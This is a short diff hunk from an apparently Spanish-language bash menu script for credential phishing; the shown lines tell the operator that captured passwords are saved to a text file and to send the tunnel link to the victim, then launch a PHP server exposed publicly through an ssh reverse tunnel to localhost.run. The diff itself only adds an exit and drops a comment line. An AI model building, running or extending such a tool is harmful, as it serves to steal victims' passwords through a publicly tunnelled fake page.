@@ -114,13 +114,13 @@ echo "La Contraseña se guarda en el archivo txt"
 echo "Enviale el link del túnel a la victima"
 echo ""
 php -S 0.0.0.0:$b & ssh -R 80:localhost:$b nokey@localhost.run -q
+exit
 ;;
 2)
 #! /bin/bash
 setterm -foreground cyan
 echo "Bye"
 exit
-#
 ;;
 esac 
 done 
